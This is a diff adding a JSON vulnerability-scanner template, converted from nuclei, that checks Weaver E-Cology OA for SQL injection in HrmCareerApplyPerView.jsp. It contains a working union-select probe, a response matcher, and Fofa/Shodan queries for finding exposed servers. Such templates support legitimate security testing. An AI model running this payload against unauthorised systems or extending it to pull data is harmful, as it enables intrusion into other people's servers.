@@ -1,0 +1,149 @@
+{
+  "id": "weaver-ecology-hrmcareer-sqli",
+  "name": "Weaver E-Cology HrmCareerApplyPerView - SQL Injection",
+  "author": "SleepingBag945",
+  "severity": "HIGH",
+  "description": "There is a SQL injection vulnerability in the HrmCareerApplyPerView.jsp file of Panwei OA E-Cology. An attacker can obtain sensitive files in the server database through the vulnerability.\n",
+  "references": [
+    "https://github.com/ibaiw/2023Hvv/blob/556de69ffc370fd9827e2cf5027373543e2513d4/%E6%B3%9B%E5%BE%AE%20HrmCareerApplyPerView%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain\u003d1#L3"
+  ],
+  "tags": [
+    "ecology",
+    "weaver",
+    "oa",
+    "sqli"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"泛微-协同办公OA\"",
+    "shodan": "ecology_JSessionid"
+  },
+  "variables": {
+    "num": [
+      "999999999"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/pweb/careerapply/HrmCareerApplyPerView.jsp?id\u003d1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes(\u0027MD5\u0027,\u0027{{num}}\u0027)),4,5,6,7",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "{{md5(num)}}"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "weaver-ecology-hrmcareer-sqli",
+    "info": {
+      "name": "Weaver E-Cology HrmCareerApplyPerView - SQL Injection",
+      "author": "SleepingBag945",
+      "severity": "high",
+      "description": "There is a SQL injection vulnerability in the HrmCareerApplyPerView.jsp file of Panwei OA E-Cology. An attacker can obtain sensitive files in the server database through the vulnerability.\n",
+      "reference": [
+        "https://github.com/ibaiw/2023Hvv/blob/556de69ffc370fd9827e2cf5027373543e2513d4/%E6%B3%9B%E5%BE%AE%20HrmCareerApplyPerView%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md?plain\u003d1#L3"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "ecology_JSessionid",
+        "fofa_query": "app\u003d\"泛微-协同办公OA\""
+      },
+      "tags": "ecology,weaver,oa,sqli"
+    },
+    "variables": {
+      "num": "999999999"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/pweb/careerapply/HrmCareerApplyPerView.jsp?id\u003d1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes(\u0027MD5\u0027,\u0027{{num}}\u0027)),4,5,6,7"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "{{md5(num)}}"
+            ],
+            "case_insensitive": false
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
